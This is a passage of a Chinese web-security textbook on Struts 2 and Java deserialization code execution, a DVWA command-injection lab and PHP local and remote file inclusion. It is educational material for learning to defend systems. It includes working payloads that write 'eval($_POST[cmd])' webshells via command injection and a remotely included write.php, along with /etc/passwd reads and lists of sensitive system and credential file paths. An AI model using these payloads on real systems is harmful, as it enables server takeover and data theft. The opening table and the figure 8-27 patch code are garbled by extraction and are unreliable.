=</td></tr><tr><td>F=I</td><td>(A)</td></tr><tr><td>C=E=(N)</td><td>(B)</td></tr><tr><td>Z=I-N=L/N</td><td>(Z)</td></tr><tr><td>T=N=M/N</td><td>A</td></tr><tr><td>T=T=N</td><td>D</td></tr><tr><td>T=T=N</td><td>E</td></tr><tr><td>T=T=N</td><td>F</td></tr></table>


图8-22 phpinfo页面


## 8.3 框架执行漏洞

现在，框架技术已经被广泛应用，越来越多的开发者喜欢使用框架。框架开发也变得更简单，更省时，更高效，甚至有些甲方公司在把项目交给乙方公司开发时，也会明确要求对方使用指定的框架来进行开发应用，如有著名的 Java 三大框架（Struts、Hibernate 和 Spring）。

Struts、Hibernate 和 Spring 是 Java 开发中的常用框架，分别针对不同的应用场景给出最合适的解决方案。

传统的 Java Web 应用程序是采用 JSP+Servlet+JavaBean 来实现的，这种模式实现了最基本的 MVC 分层，使得程序结构分为几层，有负责前台展示的 JSP、负责流程逻辑控制的 Servlet 以及负责数据封装的 JavaBean。但是这种结构仍然存在问题：如 JSP 页面中需要使用<%>符号嵌入很多的 Java 代码，造成页面结构混乱，Servlet 和 JavaBean 负责了大量的跳转和运算工作，耦合紧密，程序复用度低等。

## ○ Struts

为了解决这些问题，出现了 Struts 框架，它是一个完美的 MVC 实现，有一个中央控制类（一个 Servlet），针对不同的业务，需要一个 Action 类负责页面跳转和后台逻辑运算，一个或几个 JSP 页面负责数据的输入和输出显示，还有一个 Form 类负责传递 Action 和 JSP 中间的数据。JSP 中可以使用 Struts 框架提供的一组标签，就像使用 HTML 标签一样简单，但是可以完成非常复杂的逻辑。从此 JSP 页面中不需要出现一行<%>包围的 Java 代码了。

可是所有的运算逻辑都放在 Struts 的 Action 里将使得 Action 类复用度低和逻辑混乱，所以通常人们会把整个 Web 应用程序分为三层，Struts 负责显示层，它调用业务层完成运算逻辑，业务层再调用持久层完成数据库的读写。

使用 JDBC 连接来读写数据库，最常见的就是打开数据库连接、使用复杂的 SQL 语句进行读写、关闭连接，获得的数据又需要转换或封装后往外传，这是一个非常烦琐的过程。

## ○ Hibernate

使用 Hibernate 框架需要创建一系列的持久化类，每个类的属性都可以简单地看作和一张数据库表的属性一一对应，当然也可以实现关系数据库的各种表件关联的对应。当需要相关操作时，不用再关注数据库表。不用再去一行行的查询数据库，只需要持久化类就可以完成增删改查的功能，使软件开发真正面向对象，而不是面向混乱的代码。使用 Hibernate 比 JDBC 方式减少了 80% 的编程量。

现在有三个层，可是每层之间的调用是怎样的呢？例如，显示层的 Struts 需要调用一个业务类，就需要 new 一个业务类出来，使用业务层需要调用持久层的类，也需要 new 一个持久层类来用。通过这种 new 的方式互相调用就是软件开发中最糟糕设计的体现。简单的说，就是调用者依赖被调用者，它们之间形成了强耦合，若想在其他地方复用某个类，则这个类依赖的其他类也需要包含，程序就变得很混乱，每个类互相依赖互相调用，复用度极低。若一个类做了修改，则依赖它的很多类都会受到牵连。为此，出现了 Spring 框架。

## Spring

Spring 的作用就是完全解耦类之间的依赖关系，一个类若要依赖什么，那就是一个接口。至于如何实现这个接口，就不重要了。只要拿到一个实现了这个接口的类，就可以轻松地通过 XML 配置文件把实现类注射到调用接口的那个类里。所有类之间的这种依赖关系就完全通过配置文件的方式替代了，所以 Spring 框架最核心的就是所谓的依赖注射和控制反转。

现在的结构是，Struts 负责显示层，Hibernate 负责持久层，Spring 负责中间的业务层，这个结构是目前国内最流行的 Java Web 应用程序架构。另外，由于 Spring 使用的依赖注射以及 AOP（面向方面编程），所以它的这种内部模式非常优秀，以至于 Spring 自己也实现了一个使用依赖注射的 MVC 框架，叫作 Spring MVC，同时为了很好地处理事务，Spring 集成了 Hibernate，使事务管理从 Hibernate 的持久层提升到了业务层，更加方便和强大。

Struts 框架 2000 年就开始起步了，到目前已经发展了十多年，技术相当成熟，目前全球 Java 开发中 Struts 框架是显示层技术中当之无愧的王者。它拥有大量的用户群和很好的开发团队。掌握 Struts，也是国内大部分 Java 软件公司对新进员工的基本要求。

## ○ 其他

Java 这个名词似乎注定和开源紧密联系在一起了，在 Java 领域，每天都有大量的开源技术出现，由于是开放源代码的，技术中存在的问题和不足很快就会被人发现，开源软件提供者会很快修正或扩展这些技术，因此版本更新很快，几个星期或者几天就有一个新版本出来。

使用框架是好事还是坏事？对于开发人员来说是好的，减轻了工作负担，可以在框架的基础上进行代码的编写，加快了开发进度，提高了工作效率。但是一旦框架出现了安全漏洞，那么危害是致命的，框架的用户群体越多，危害就越大。Struts 2 暴出的 S2-032 的高危漏洞，当时导致全球使用 Struts2 架构的网站几乎无一幸免。

## 8.3.1 Struts 2 代码执行漏洞

## 1. 什么是 Struts 2 漏洞

Struts 是 Apache 软件基金会（ASF）赞助的一个开源项目，通过采用 JavaServlet/JSP 技术，实现基于 JavaEE Web 应用的 MVC 设计模式的应用框架，Struts 2 是 Struts 的下一代产品，是在 Struts 1 和 WebWork 的技术基础上进行了合并的全新的 Struts 2 框架。

Struts 2 框架广泛应用于政府、公安、交通、金融行业和运营商的网站建设，作为网站开发的底层模板使用。Struts 2 漏洞主要指的是 J2EE 开源框架 Struts 2 出现的命令执行漏洞，危害巨大，可导致远程执行任意系统命令，进而获取系统控制权，数据库控制权，导致信息泄露。所有使用 Struts 2 框架开发的系统都会受到影响。

Struts 2 攻防对抗历史简要回顾:

Struts 2 的代码执行问题最早要追溯到 2010 年, 当时来自 Google Security Team 的 Meder Kydyraliev 发现可以通过用 unicode 编码的形式绕过参数拦截器对特殊字符 “#” 的过滤, 造成代码执行问题, 官方漏洞编号为 S2-003, 这也是最早的存在记录的一个 Struts 2 远程代码执行漏洞。对于第一个出现的 Struts 2 远程代码执行漏洞，官方当时并没有意识到这已经打开了潘多拉的魔盒，通过传递非法参数绕过过滤调用 OGNL 表达式，这也就是后来多数的 Struts 远程代码执行漏洞的利用流程。对于 S2-003 官方只是简单的用正则表达式将含有\u0023 的请求全部过滤掉，由于\u0023 在传递的过程中被转义为\u0023，所以正则根本没有匹配上。导致漏洞的第一次修补实际上失败了。

OGNL 表达式可以调用 Java 的静态方法，开发者后来也意识到命令执行的危害。后来 OGNL 上下文中一些命名空间中的属性，例如，将#_memberAccess.allowStaticMethodAccess 设置为 true, #context["xwork.MethodAccessor.denyMethodExecution"]设置为 false。但是通过 unicode 编码绕过过滤规则的问题依然存在。例如，将\u0023 换成八进制的\43，即可绕过官方当时的修复。

后来官方终于意识到了问题的严重性，在过滤时更加严谨地改写了正则表达式，过滤掉了出现“\”“@”等字符的请求内容，官方修改的正则表达式如图8-23所示。

```html
<interceptor-ref name='params'>
    <param name="excludeParams">dojo\..*,^struts\..*,.*\\..*,.*\\..*(..*,.*\\).*,.*@..*</param>
</interceptor-ref> 
```


图 8-23 官方补丁细节


修补后的正则表达式虽然更为严谨，但是问题依然存在。大概是在 2011 年，Google Security Team 的一位成员又提出了新的利用思路（CVE-2011-3923），借助 Action 实例中的私有变量的 set 方法执行 OGNL，调用 Java 静态方法执行任意命令。对于这个 CVE，官方依然是通过正则表达式过滤的方式来修复的，如图 8-24 所示。

```xml
<interceptor-ref name='params'>
    <param name="acceptParamNames">\w+((\. \w+) | ([d+]) | ([\&$39:\w+$\$39:]))) *</param>
</interceptor-ref> 
```


图 8-24 官方补丁细节


由于 Struts 2 框架底层是利用 OGNL 表达式实现的，官方为了防止在 OGNL 表达式中直接调用 Java 静态方法，在 OGNL 上下文中内置了几个命名对象，例如，#_memberAccess["allowStaticMethodAccess"] 默认被设置为 false，#context["xwork. MethodAccessor.deny MethodExecution"] 默认被设置为 true。

但是上面提到的这几个属性的值可以利用执行 OGNL 进行修改，修改相关属性之后，又可以直接调用 Java 静态方法。

2013 年，在对 S2-013 的修补中，#_memberAccess["allowStaticMethodAccess"]的属性被设置为没有权限被修改。这样看似从根本上解决了问题，但是利用 Java 反射类来访问私有成员变量的方式依然可以绕过，直接修改前面那两个属性。

此外，使用 java.lang.ProcessBuilder 这个类，new 一个实例然后调用 start() 方法，便达到命令执行的目的，也可以绕过 Apache 设置的限制。

此后出现了 S2-016，这个漏洞是 DefaultActionMapper 类，支持以 action:、redirect:、redirectAction:作为导航或是重定向前缀，但是这些前缀后面同时可以跟 OGNL 表达式，由于 Struts 2 没有对这些前缀做过滤，又导致命令执行。

此后官方对于 S2-020 的修复依然是头痛医头脚痛医脚，使用正则表达式来过滤用户请求（依然导致了大量的绕过）。

Struts 2 历届的漏洞补丁页面可以从以下页面查看到:

https://struts.apache.org/docs/security-bulletins.html 

## 2. S2-032 漏洞技术分析

此次漏洞存在于 Struts 2 的动态方法引用功能。只要在 Struts 2 配置文件中开启该功能，就可能被利用。

<constant name="struts.enable.DynamicMethodInvocation" value="true" /> 

若请求 http://localhost/index.action?method:OGNL 的情况下, 请求的 OGNL 表达式会被执行, 造成命令执行。method 后面跟的方法名会被 Struts 2 进行解析, 代码位于 DefaultActionMapper.java 中, 如图 8-25 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0076_8fdeeef37304.jpg)



图 8-25 DefaultActionMapper 代码


可以看到:

mapping.setMethod(key.substring(METHOD_PREFIX.length()))); 

将传入的方法加入到 map 中，然后在 DefaultActionInvocation.java 中被 invokeAction 引用，如图 8-26 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0077_ed4e50327636.jpg)



图 8-26 DefaultActionMapper 代码


invokeAction 首先获取方法字符串，然后调用 ognlUtil.getValue 来执行方法并获取方法结果。问题就出在传给 OGNL 的 methodName 没有进行严格的过滤，尤其是没有过滤 OGNL 关键字，从而造成命令执行。

通过对比图 8-27，可以发现修补的位置。

<table><tr><td>public DefaultActionReppor() {
    prefixTrio = new PrefixTrio() {
        put(ACTION_PREFIX, new ParameterAction() {
            public void execute(String key, ActionMapping Note;
        if (allowDynamicMethodCalls) {
            &lt;nping, corebased(key, clustering(KEYID_PREF)</td><td>public DefaultActionReppor() {
        prefixTrio = new PrefixTrio() {
        put(ACTION_PREFIX, new ParameterAction() {
            public void execute(String key, ActionMapping Note;
        if (allowDynamicMethodCalls) {</td><td>public DefaultActionReppor() {
        prefixTrio = new PrefixTrio() {
        put(ACTION_PREFIX, new ParameterAction() {
            public void execute(String key, ActionMapping Note;
        if (allowDynamicMethodCalls) {</td></tr><tr><td>}):</td><td></td><td>}):</td></tr><tr><td>put(ACTION_PREFIX, new ParameterAction() {
            public void execute(final String key, ActionMapping Note);
        if (allowActionPrefix) {
            String name = key.substring(ACTION_PREFIX
            if (allowDynamicMethodCalls) {
                int bang = name.index0f(&#x27;!&#x27;); 
                if (bang != -1) {</td><td>put(ACTION_PREFIX, new ParameterAction() {
            public void execute(final String key, ActionMapping Note);
        if (allowActionPrefix) {
            String name = key.substring(ACTION_PREFIX
            if (allowDynamicMethodCalls) {
                int bang = name.index0f(&#x27;!&#x27;); 
                if (bang != -1) {</td><td>put(ACTION_PREFIX, new ParameterAction() {
            public void execute(final String key, ActionMapping Note);
        if (allowActionprefix) {
            String name = key.substring(ACTION_PREFIX
            if (allowDynamicMethodCalls) {
                int bang = name.index0f(&#x27;!&#x27;); 
                if (bang != -1) {</td></tr><tr><td>string method = name.substring(box)
    &lt;nping.setMethod(method);
        name = name.substring(0, bang);</td><td rowspan="2">string method = 62.1.3.1.3.1.3.1.3.1.3.1.3.1.3.1.3.1.3.1.3.1.3.1.3.1.3.1.3.1.3.1.3.1.3.1.3.1.3.1.3.1.3.1.3.1.3.1.3.1.3.1.4
    &lt;nping.setMethod(method);
        name = name.substring(0, bang);</td><td rowspan="2">string actionName = cleanupActionName{no}
        if (allowSlashesInActionNames &amp;5 following
        if (actionName.startwith(&quot;&quot;)) {
            actionName = actionName.substring
        }
        }</td></tr><tr><td>String actionName = cleanupActionName{no}
        if (allowSlashesInActionNames &amp;5 following
        if (actionName.startwith(&quot;&quot;)) {
            actionName = actionName.substring
        }</td></tr></table>


图 8-27 补丁代码对比


在进行方法添加时，对传进来的方法进行了过滤，调用了 cleanupActionName。cleanupActionName 的定义如图 8-28 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0078_99b31e6adb9a.jpg)



图 8-28 cleanupActionName 代码位置


其中，allowedActionNames 定义是：

```javascript
protected Pattern allowedActionNames = Pattern.compile("[a-zA-Z0-9._!^\-]*"); 
```

代码的含义是去除一切不在上述范围的字符。

## 3. 漏洞检测工具

Struts 2 漏洞检测工具有很多，但实现功能都大同小异，K8 安全团队的这个检测程序是其中经典之一，通过这个工具，可检测的漏洞范围如图 8-29 所示，操作也很简单，在目标地址栏处输入网站地址，再选择相应漏洞名称，单击“获取信息”按钮，即可检查网站是否存在相关漏洞。

![image](MinerU_markdown_Web安全基础教程_assets/image_0079_c468be1004e3.jpg)



图 8-29 K8 Struts 2 漏洞利用工具


## 8.3.2 Java 反序列化代码执行漏洞

## 1. 背景

2015年11月6日，FoxGlove Security 安全团队的@breenmachine 发布的一篇博客中介绍了如何利用 Java 反序列化漏洞，来攻击最新版的 WebLogic、WebSphere、JBoss、Jenkins、OpenNMS 这些大名鼎鼎的 Java 应用，实现远程代码执行。

其实早在 2015 年 1 月 28 日，国外的安全研究员 Gabriel Lawrence 和 Chris Frohoff 在 AppSecCali 上给出了一个报告，报告中已经指出 Java 反序列化漏洞可以利用 Apache Commons Collections 这个常用的 Java 库来实现任意代码执行。

## 2. Java 反序列漏洞简介


序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中；反序列化即逆过程，由字节流还原成对象。Java 中的 ObjectOutputStream 类的 writeObject() 方法可以实现序列化，类 ObjectInputStream 类的 readObject() 方法用于反序列化。如图 8-30 所示是将字符串对象先进行序列化，存储到本地文件，然后再通过反序列化进行恢复的样例代码。


<table><tr><td>public static void main(String args[]) throws Exception {
String obj = &quot;hello world!&quot;;
// 将序列化对象写入文件object.db中
FileOutputStream fos = new FileOutputStream(&quot;object.db&quot;);
ObjectOutputStream os = new ObjectOutputStream(fos);
os.writeObject(obj); os.close();
// 从文件object.db中读取数据
FileInputStream fis = new FileInputStream(&quot;object.db&quot;);
ObjectInputStream ois = new ObjectInputStream(fis);
// 通过反序列化恢复对象obj String obj2 = (String)vis.readObject();
ois.close();
}</td></tr></table>


图8-30 Java反序列化代码


问题在于，若 Java 应用对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。

所以这个问题的根源在于类 ObjectInputStream 在反序列化时，没有对生成的对象的类型做限制；假如反序列化可以设置 Java 类型的白名单，那么问题的影响就小了很多。

本节对该漏洞的原理将不再详细描述，可参考长亭科技在 2015 年 11 月初发布的针对该漏洞的详细原理介绍《Lib 之过？Java 反序列化漏洞通用利用分析》（https://blog.chaitin.com/2015-11-11_java_unserialize_rce/?from=timeline&isappinstalled=0#rd）。

在漏洞公布的第一时间，经长亭科技团通过简单的全网分析和 POC 验证数据分析如下（见图 8-31）：

![image](MinerU_markdown_Web安全基础教程_assets/image_0080_082810104292.jpg)



图8-31 来自Shadon的统计数据


Jenkins 受到该漏洞影响较大，在自测中，全球暴露在公网的 11059 台均受到该问题影响，Zoomeye 的公开数据中再测试后有 12493 台受到该漏洞影响，Shadon 的公开数据中 16368 台 Jenkins 暴露公网可能受到影响（未复测 Shadon 数据）。

因为 WebLogic 公开到公网的数据较少，所以受影响程度也稍浅，在自测中，全球 486 台均受到该问题影响，Zoomeye 的公开数据中再测试后有 201 台受到该漏洞影响，Shadon 的公开数据中，806 台 WebLogic 可能受到影响（未复测 Shadon 数据）。

JBoss 因为需要/invoker/JMXInvokerServlet 的支持，所以受影响面稍小（未具体检测 JBoss 中没有删除/invoker/JMXInvokerServlet 的数据），在自测中，全球 29194 台 JBoss 暴露在公网，但由于大部分 JBoss 都删除了 JMX，所以真正受到影响的覆盖面并不广，Zoomeye 的公开数据中有 7770 台 JBoss 暴露在公网，Shadon 的公开数据中有 46317 台 JBoss 暴露在公网。

WebSphere 在自测中，全球暴露在公网的 2076 台均受到该问题影响，Zoomeye 的公开数据中再测试后仍有 4511 台 WebSphere 受到影响，Shadon 的公开数据中，5537 台 WebSphere 可能受到影响（未复测 Shadon 数据）。

## 3. 漏洞检测工具

针对 Java 反序列化漏洞，简单介绍一款检测工具，运行环境为 JDK 1.8，使用方法如图 8-32 所示：输入相关地址信息，单击“获取信息”按钮，若存在相关漏洞，会在下方标签框中显示网站路径、目录、当前用户等信息，可通过相关模块上传文件、查看网站结构、执行系统命令等。

![image](MinerU_markdown_Web安全基础教程_assets/image_0081_ee8758cf1f69.jpg)



图 8-32 Java 反序列化测试工具


## 8.4 实战操作

本小节通过 DVWA 中命令执行漏洞模块进行一次实战操作演示。详细操作流程请参考第 8 章视频 8-1。

第一步：进入 DVWA 漏洞演示平台，选择命令执行漏洞模块（Command Execution）。

在操作系统中，可以通过“&&”“||”“;”等分隔符号在一行中执行多条命令。

根据提示，在文本框中输入 IP 地址 127.0.0.1 来测试网络通信情况，通过分析返回数据包信息，确定功能正常，可以执行系统命令，如图 8-33 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0082_da68fc67497f.jpg)



图 8-33 Ping 本地网卡


第二步：从返回结果中可以知道，返回了3个数据包，即执行了3次Ping命令，网络虽然是连通的，还需确认目标是什么操作系统，通过查看网站源代码，获取更多的信息，如图8-34所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0083_2dd645769509.jpg)



图8-34 分析DVWA的源代码


通过源代码可以了解到，若是 Windows 操作系统，执行 Ping 命令，根据常识可以知道，在 Windows 平台中执行 Ping 命令，默认是发送 4 次数据包；若不是 Windows 系统，则发送 3 次数据包，因为 Linux 操作系统若不加-c 参数，会一直执行 Ping 命令，直到手工停止。

根据返回信息可以知道，服务器使用的是 Linux 操作平台，因为返回的数据包中返回了 3 次数据信息。

根据以上信息可知服务器使用的是 Linux 操作系统。

第三步：尝试使用分隔符在一行中执行多条命令，如图 8-35 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0084_2b30dfbf3794.jpg)



图 8-35 执行系统命令 ls


根据返回信息，可以成功使用“&&”在一行中执行多条命令，使用 ls 命令查看了当前目录下所存在的文件信息。

第四步：通过在网站目录下写入一个 WebShell 木马来获取服务器的权限。

使用 127.0.0.1&&pwd 查看网站当前路径为/var/www/dvwa/vulnerabilities/exec，如图 8-36 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0085_9a3f17077d2f.jpg)



图 8-36 执行系统命令 pwd


第五步：确定网站目录，通过浏览器地址及第四步中当前路径，可以尝试在当前目录下写入一个一句话木马，使用如下命令向当前路径下写入一个 PHP 文件（可通过相关工具进行连接），如图 8-37 和图 8-38 所示。


127.0.0.1 && echo "<?phpeval(\$_POST[cmd]);?>">cmd.php


![image](MinerU_markdown_Web安全基础教程_assets/image_0086_79df4ffed42b.jpg)



图 8-37 暴露当前 Web 路径信息


![image](MinerU_markdown_Web安全基础教程_assets/image_0087_f72f267a8296.jpg)



图 8-38 写入一句话木马


第六步：写入文件后，没有提示信息，需要自行查看文件是否被写入到服务器，使用ls命令查看当前路径下文件信息，发现cmd.php成功被写入，如图8-39所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0088_a649891d2205.jpg)



图 8-39 查看一句话木马文件


第七步：根据获取到的路径及文件名，访问相关木马文件 http://10.10.10.133/dvwa/vulnerabilities/exec/cmd.php，没有报错，说明木马文件被正常解析，如图 8-40 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0089_99487bdc7fb2.jpg)



图8-40 解析一句话木马


第八步：使用一句话连接终端，添加 Shell，输入地址、密码信息，单击“添加”按钮，完成对此木马文件的配置，如图 8-41 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0090_08e5fc8a86ab.jpg)



图 8-41 配置连接一句话木马的参数


双击添加好的木马链接信息，可连接相关服务器，如图 8-42 所示，进而获取系统权限。

![image](MinerU_markdown_Web安全基础教程_assets/image_0091_633346f9111b.jpg)



图8-42 连接一句话木马


# 文件包含漏洞

程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，而无须再次编写，这种调用文件的过程一般被称为包含。

程序开发人员都希望代码更加灵活，所以通常会将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。

几乎所有的脚本语言中都提供文件包含功能，但文件包含漏洞在 PHP 应用程序中居多，而在 ASP，JSP 程序中却很少，这与程序开发人员的水平无关，问题在于语言设计的弊端。

## 9.1 包含漏洞原理解析

文件包含漏洞是“代码注入”的一种，其原理就是注入一段用户能控制的脚本或代码，并让服务端执行。“代码注入”的典型代表就是文件包含，文件包含漏洞可能出现在JSP、PHP、ASP等语言中，原理都是一样的，本章只介绍PHP文件包含漏洞。

要想成功利用文件包含漏洞进行攻击，需要满足以下两个条件：

- Web 应用采用 include()等文件包含函数，通过动态变量的方式引入需要包含的文件。

- 用户能够控制该动态变量。
在 PHP 中，有 4 个用于包含文件的函数，当使用这些函数包含文件时，文件中包含的 PHP 代码会被执行。下面对它们之间的区别进行解释。

○ include(): 当使用该函数包含文件时，只有代码执行到 include() 函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。

○ include_once(): 功能和 include()相同，区别在于当重复调用同一文件时，程序只调用一次。

require(): require()与 include()的区别在于，require()执行若发生错误，函数会输出

错误信息，并终止脚本的运行。使用 require() 函数包含文件时，只要程序一执行，立即调用文件，而 include() 只有程序执行到该函数时才调用。

require_once(): 功能与 require()相同，区别在于当重复调用同一文件时，程序只调用一次。

PHP 中的文件包含分为本地包含和远程包含，本章将详细介绍这两种文件包含。

## 9.1.1 本地文件包含

能够打开并包含本地文件的漏洞，被称为本地文件包含漏洞（LFI）。利用本地文件包含漏洞，可以查看系统任意文件内容，若具备一些条件，也可以执行命令。

有时可能不能确定需要包含哪个文件，例如，先来看下图 9-1 所示的文件 lfi.php 的代码。

![image](MinerU_markdown_Web安全基础教程_assets/image_0092_2a63f4a5373f.jpg)



图9-1 代码内容


上面这段代码的使用格式可能是这样的：

```txt
http://hi.baidu.com/m4r10/php/index.php?page=main.php 
```

或者：

```javascript
http://hi.baidu.com/m4r10/php/index.php?page=downloads.php 
```

结合上面的代码，简单介绍是如何实现的：

(1) 提交上面的 URL, 在 lfi.php 中就取得 page 的值 (\$_GET[page])。

(2) 判断 $_GET[page] 是否为空, 若不空 (这里是 main.php), 就用 include 来包含这个文件。

(3) 若$_GET[page]为空, 就执行 else, 来包含 home.php 这个文件。

访问如下 URL:

```txt
http://hi.baidu.com/m4r10/php/index.php?page=hello.php 
```

lfi.php 程序会按照上面介绍的步骤去执行：取 page 为 hello.php，然后去掉 include(hello.php)，由于没有 hello.php 这个文件，所以包含时就会报警，如图 9-2 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0093_401e6c35d2aa.jpg)



图 9-2 警告信息


注意上面的那个 Warning 就是找不到指定的 hello.php 文件，也就是包含不到指定路径的文件；而后面的警告是因为前面没有找到指定文件，所以包含时给出警告。

如何利用？

本节介绍比较常见的利用方法：包含读出目标机上其他文件。

由前面可以看到，由于对取得的参数 page 缺乏过滤，于是可以任意指定获取目标主机上的其他敏感文件，例如，在前面的警告中，暴露了绝对路径（/var/www/），那么就可以多次探测来包含其他文件，例如，指定 URL 为：

```txt
http://10.10.10.133/lfi.php?page=test.txt 
```

可以读出当前路径下的 text.txt 文件，也可以使用.././进行目录跳转（在没过滤../的情况下）；还可以直接指定绝对路径，读取敏感的系统文件，例如，http://10.10.10.133/lfi.php?page=/etc/passwd，如图 9-3 所示，若目标主机没有对权限限制得很严格，或者启动 Apache 的权限比较高，是可以读出这个文件内容的，否则就会得到一个类似于 open_basedir restriction in effect 的警告。

<table><tr><td>←→C 10.10.10.133/lfi.php?page=/etc/passwd</td></tr><tr><td>root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/ sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/ gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin libuuid:x:100:101::/var/lib/libuuid:/bin/sh dhcp:x:101:102::/nonexistent:/bin/false syslog:x:102:103::/home/syslog:/klog:x:103:104::/home/klog:/bin/false sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash bind:x:105:113::/var/cache/bind:/bin/false postfix:x:106:115::/var/spool/postfix:/bin/false ftp:x:107:65534::/home/ftp:/bin/false postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false distccd:x:111:65534::/:/bin/false user:x:1001:1001:just a user,111,,,:/home/user:/bin/bash service:x:1002:1002,,,:/home/service:/bin/bash telnetd:x:112:120::/nonexistent:/bin/proftpd:x:113:65534::/var/run/proftpd:/bin/false statd:x:114:65534::/var/lib/nfs:/bin/false snmp:x:115;65534::/var/li</td></tr></table>


图 9-3 读取/etc/passwd 文件内容


## 9.1.2 远程文件包含

若 php.ini 的配置选项 allow_url_fopen 和 allow_url_include 为 ON，则文件包含函数是可以加载远程文件的，这种漏洞被称为远程文件包含漏洞。利用远程文件包含漏洞，可以直接执行任意命令。

进行 RFI 攻击需要目标机器同时具备三个条件：

○ allow_url_fopen = On（默认开启）。

○ allow_url_include = On（默认关闭）。

○ 被包含的变量前没有目录的限制。

下面是 PHP 远程包含的例子。http://192.168.10.252/twiki/php.txt 目录下存在 php.txt 文件，内容如图 9-4 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0094_b672cbae822d.jpg)



图 9-4 php.txt 文件内容


Rfi.php 文件内容如图 9-5 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0095_84955a308b1f.jpg)



图 9-5 Rfi.php 文件内容



访问 http://192.168.10.111/rfi.php?file=http://192.168.10.252/twiki/php.txt，执行结果如图 9-6 所示，成功解析远程文件。


<table><tr><td>← → Ⓖ 192.168.10.111/rfi.php?file=http://192.168.10.252/twiki/php.txt</td></tr><tr><td>hello world</td></tr></table>


图 9-6 解析远程文件


远程包含与本地包含没有区别，无论是哪种扩展名，只要遵循 PHP 语法规范，PHP 解析器就会对其解析。

若某个页面确定存在文件包含漏洞后，攻击者如何利用包含漏洞来攻击 Web 应用程序呢？下面将剖析几种常见的攻击方式。

## 1. 读取敏感文件

访问 URL: http://192.168.10.111/rfi.php?file=/etc/passwd，若目标主机文件存在，并且拥有相应权限，那么就可以读出文件内容。反之，就会得到一些类似于 open_basedir restriction in effect 的警告。

常见的敏感信息路径如下。

Windows 系统:

```batch
C:\boot.ini //查看系统版本
C:\windows\system32\inetsrv\metabase.xml //TIS 配置文件
C:\windows\repair\sam
//存储 windows 系统初次安装的密码
C:\program files\mysql\my.ini //MySQL 配置
C:\program files\mysql\data\mysql\user.MYD //MySQL 用户信息
```

## UNIX/Linux 系统:

```txt
/etc/passwd
/usr/local/app/apache2/conf/httpd.conf    //Apache 2 默认配置文件
/usr/local/app/apache2/conf/extra/httpd-vhosts.conf    //虚拟网站设置
/usr/local/app/php5/lib/php.ini    //PHP 相关设置
/etc/httpd/conf/httpd.conf    //Apache 配置文件
/etc/my.cnf    //MySQL 配置文件
```

## 2. 远程包含 shell

若目标机 allow_url_fopen 选项是激活的，可以尝试远程包含一句话木马，在 write.php

文件中内容如图 9-7 所示。

```php
<?fputs (fopen('shell.php', 'w'), "<?php eval($_POST[cmd]);?>")?> 
```


图9-7 write.php文件内容


当访问存在漏洞的地址 http://192.168.10.111/rfi.php?file=http://192.168.10.252/twiki/write.php 时，会在 rfi.php 文件目录下生成 shell.php 文件，内容为<?phpeval($_POST [cmd]);?>，使用相关连接工具，可获取服务器权限。

## 3. 本地包含配合文件上传

很多网站通常会提供文件上传功能，例如，上传头像、文档等，假设已经上传一句话图片木马到服务器，路径为/uploadfile/20160612.jpg，代码如图9-8所示。

```php
<?fputs (fopen('shell.php', 'w'), "<?php eval($_POST[cmd]);?>")?> 
```


图 9-8 20160612.jpg 文件内容


访问 http://192.168.10.111/rfi.php?file=/uploadfile/20160612.jpg，包含这张图片，将会在 'rfi.php 所在的目录下生成 shell.php 文件。

## 4. 包含 Apache 日志文件

某个 PHP 文件存在本地包含漏洞导致无法上传文件时, 这种情况就像明明有注入漏洞, 却无法注入数据一样, 明明是一个高危漏洞, 却无法深度利用。但还有另外一个方法, 就是找到 Apache 路径, 利用包含漏洞包含 Apache 日志文件也可以获取 WebShell。

Apache 运行后一般默认会生成两个日志文件，这两个文件是 access.log（访问日志）和 Error.log（错误日志），Apache 的访问日志文件记录了客户端的每次请求及服务响应的相关信息，例如，当请求 rfi.php 页面时，Apache 就会记录下这个操作，并且写到访问日志文件 access.log 中，如图 9-9 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0096_12ac52be49ea.jpg)



图 9-9 access.log 文件内容


从文件内容可以看出，每一行记录一次网站访问记录，由7部分组成，格式如下：

客户端地址—访问者的标识—访问者的验证名称—请求的时间—请求类型—响应的HTTP状态码—发送给客户端的字节数。

